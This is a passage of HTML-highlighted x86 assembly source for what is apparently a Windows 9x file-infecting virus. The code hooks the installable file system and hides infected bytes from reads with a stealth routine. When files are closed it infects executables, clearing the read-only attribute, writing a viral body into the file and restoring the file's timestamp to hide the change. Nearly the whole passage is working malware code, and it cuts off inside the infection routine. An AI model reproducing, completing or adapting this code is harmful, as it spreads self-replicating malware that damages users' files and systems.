                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_pos</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ReadPosInFile</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoRead</span><span class="sc0">
</span><span class="sc5">ReadPosInFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">DoRead</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_length</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">FixReadSize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_length</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FixReadSize</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_length</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_pos</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">StealthReadData</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_length</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

</span><span class="sc5">StealthReadData</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.eh_st</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_length</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">ReadStealthLoop</span><span class="sc4">:</span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; load st_size</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">           </span><span class="sc1">; load_st_pt</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; eax = st_size, ebx = st_pt</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">DoStealthData</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">DoStealthData</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">DoNextStealthData</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DoNextStealthData</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">MoveStealthData</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">MoveStealthData</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">DoNextStealthData</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReadStealthLoop</span><span class="sc0">


</span><span class="sc5">FuncCloseFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.UniPath</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">szPathName</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.szPathName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileNameByHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.PathNameSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.szPathName</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; get extend name</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202000h</span><span class="sc0">   </span><span class="sc1">; lower case</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">
                </span><span class="sc1">;jne     toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_READONLY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">SHARE_DENYNONE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_attr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.FileAttributes</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_dostime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.FileDateTime</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectHandle</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.FileAttributes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileAttributes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_READWRITE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">SHARE_DENYREADWRITE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">restoreFileAttr</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInfectedData</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.FileDateTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileDateTime</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">restoreFileAttr</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.FileAttributes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileAttributes</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">


</span><span class="sc5">WriteInfectedData</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.eh_st</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">write_loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">st</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">)</span><span class="sc5">.st_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">write_body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">st</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">)</span><span class="sc5">.st_pt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">WriteInfectedDataErr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">WriteInfectedDataErr</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_loop</span><span class="sc0">

</span><span class="sc5">write_body</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vir_file_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.VirData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">for_disinfect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">host_data</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">HostData</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc5">.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">WriteInfectedDataErr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">WriteInfectedDataErr</span><span class="sc0">

</span><span class="sc5">for_disinfect</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">WriteInfectedDataErr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">WriteInfectedDataErr</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
</span><span class="sc5">WriteInfectedDataErr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; infect file by handle</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc5">InfectHandle</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">InfectHandleErr</span><span class="sc0"> </span><span class="sc1">; error</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectHandleErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.eh.eh_sign</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectHandleErr</span><span class="sc0"> </span><span class="sc1">; checks for 'MZ' sign</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe_inhs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.eh.eh_neh_ofs</span><span class="sc4">]</span><span class="sc0">
